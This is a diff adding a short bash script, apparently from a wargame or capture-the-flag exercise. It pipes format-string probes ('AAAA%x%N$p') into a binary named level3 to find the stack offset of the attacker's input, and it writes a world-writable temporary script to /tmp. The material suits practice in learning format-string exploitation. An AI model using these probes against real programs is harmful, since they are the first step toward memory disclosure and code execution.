@@ -1,0 +1,20 @@
+#!/bin/bash
+
+file="/tmp/.tmp"
+rm -f $file
+
+echo "#!/bin/bash" >> $file
+i=$1
+while [ $i -lt $2 ]
+do
+	i2=$[$i+1]
+	echo "echo -n \"$i	>	\"" >> $file
+	echo "/usr/bin/python -c 'import sys; sys.stdout.write(\"AAAA%00000x%$i\$p\")' | env -i ./level3" >> $file
+	echo "echo \"\"" >> $file
+	i=$[$i+1]
+done
+
+chmod 777 $file
+$file
+
+rm -f $file
